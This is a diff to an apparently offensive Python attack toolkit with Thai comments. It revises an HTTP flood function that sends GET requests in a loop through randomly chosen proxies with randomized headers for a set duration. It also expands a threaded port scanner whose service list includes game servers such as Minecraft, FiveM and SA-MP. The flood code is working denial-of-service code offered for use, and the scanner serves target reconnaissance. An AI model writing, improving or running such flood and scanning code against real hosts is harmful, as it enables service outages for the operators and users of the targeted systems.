@@ -7,29 +7,39 @@ import asyncio  # นำเข้าโมดูล asyncio สำหรับ a
 import aiohttp  # นำเข้าโมดูล aiohttp สำหรับ async HTTP
 import concurrent.futures  # นำเข้าโมดูล concurrent.futures สำหรับ ThreadPoolExecutor
 from scapy.all import *  # นำเข้าโมดูล scapy สำหรับ packet crafting
-from .config import CONFIG  # นำเข้าการตั้งค่าจาก config
-from .utils import get_random_headers, load_file_lines  # นำเข้าฟังก์ชันยูทิลิตี้
+from src.config import CONFIG  # นำเข้าการตั้งค่าจาก config
+from src.utils import get_random_headers, load_file_lines  # นำเข้าฟังก์ชันยูทิลิตี้
+from src.security import increment_thread_counter, decrement_thread_counter, increment_socket_counter, decrement_socket_counter
+from rich.console import Console
+from rich.table import Table
+from rich.live import Live
+from rich.panel import Panel
+
+console = Console()
 
 
 # Layer 7 HTTP Flood (with proxies support)  # สำหรับฟังก์ชัน
 def http_flood(url, duration, proxies=None, monitor=None, max_requests=0):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
     """Basic HTTP GET flood with proxy support"""  # ของฟังก์ชัน
-    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุดการโจมตี
-    session = requests.Session()  # สร้าง session สำหรับ HTTP requests
+    try:
+        end_time = time.time() + duration  # คำนวณเวลาสิ้นสุดการโจมตี
+        session = requests.Session()  # สร้าง session สำหรับ HTTP requests
 
-    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
-        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
-            break
+        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
+            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
+                break
 
-        try:  # ลองส่งคำขอ
-            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
-            response = session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
-            if monitor:  # ถ้ามี monitor
-                monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)  # อัปเดตสถิติ
-        except Exception as e:  # จัดการข้อผิดพลาด
-            if monitor:  # ถ้ามี monitor
-                monitor.update_stats(failed=1)  # อัปเดตสถิติการล้มเหลว
-            continue  # ข้ามไปทำต่อ
+            try:  # ลองส่งคำขอ
+                proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
+                response = session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
+                if monitor:  # ถ้ามี monitor
+                    monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)  # อัปเดตสถิติ
+            except Exception as e:  # จัดการข้อผิดพลาด
+                if monitor:  # ถ้ามี monitor
+                    monitor.update_stats(failed=1)  # อัปเดตสถิติการล้มเหลว
+                continue  # ข้ามไปทำต่อ
+    finally:
+        decrement_thread_counter()
 
 
 # Async Layer 7 Advanced (aiohttp for faster)  # สำหรับฟังก์ชัน
@@ -536,12 +546,14 @@ def port_scanner(target, ports, threads):
     """Port scanner function with service identification"""
     # Common ports directory
     COMMON_PORTS = {
-        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
-        53: "DNS", 80: "HTTP", 110: "POP3", 115: "SFTP",
-        135: "Microsoft RPC", 139: "NetBIOS", 143: "IMAP",
-        161: "SNMP", 443: "HTTPS", 445: "Microsoft-DS (SMB)",
-        1433: "SQL Server", 3306: "MySQL", 3389: "RDP",
-        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy",
+        20: "FTP-Data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+        53: "DNS", 80: "HTTP", 88: "Kerberos", 110: "POP3", 115: "SFTP",
+        135: "Microsoft RPC", 139: "NetBIOS", 143: "IMAP", 161: "SNMP",
+        389: "LDAP", 443: "HTTPS", 445: "Microsoft-DS (SMB)", 465: "SMTPS",
+        587: "SMTP Submission", 636: "LDAPS", 993: "IMAPS", 995: "POP3S",
+        1433: "SQL Server", 1521: "Oracle DB", 3306: "MySQL", 3389: "RDP",
+        5000: "Flask/Docker", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
+        8000: "HTTP-Alt", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt", 27017: "MongoDB",
         25565: "Minecraft", 30120: "FiveM/GTA", 7777: "SA-MP"
     }
 
@@ -556,17 +568,37 @@ def port_scanner(target, ports, threads):
             return None
 
     open_ports = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(scan_port, port) for port in ports]
-        for future in concurrent.futures.as_completed(futures):
-            result = future.result()
-            if result:
-                open_ports.append(result)
-                service = COMMON_PORTS.get(result, "Unknown Service")
-                print(f"[+] Port {result} is OPEN ({service})")
+    
+    if not ports:
+        console.print("[bold red]❌ No ports specified to scan![/bold red]")
+        return
 
-    print(f"\n[!] Scan complete. Total open ports: {len(open_ports)}")
-    for port in sorted(open_ports):
-        service = COMMON_PORTS.get(port, "Unknown")
-        print(f"    - {port}: {service}")
+    table = Table(title=f"Scan Results for {target}", border_style="cyan")
+    table.add_column("Port", style="yellow")
+    table.add_column("Status", style="green")
+    table.add_column("Service", style="magenta")
+
+    console.print(f"[bold blue]🔍 Starting scan on {target} ({len(ports)} ports)...[/bold blue]")
+
+    with console.status(f"[bold green]Scanning {len(ports)} ports on {target}...", spinner="bouncingBall"):
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [executor.submit(scan_port, port) for port in ports]
+            for future in concurrent.futures.as_completed(futures):
+                result = future.result()
+                if result:
+                    open_ports.append(result)
+                    service = COMMON_PORTS.get(result, "Unknown Service")
+                    # Immediate feedback
+                    console.print(f"  [bold green]✔[/] [yellow]{result}[/] ([magenta]{service}[/])")
+
+    if open_ports:
+        for port in sorted(open_ports):
+            service = COMMON_PORTS.get(port, "Unknown Service")
+            table.add_row(str(port), "OPEN", service)
+        
+        console.print("\n")
+        console.print(table)
+        console.print(Panel(f"[bold green]✅ Scan complete. Found {len(open_ports)} open ports.[/bold green]", border_style="green"))
+    else:
+        console.print(Panel(f"[bold red]❌ Scan complete. No open ports found on {target}.[/bold red]", border_style="red"))
 
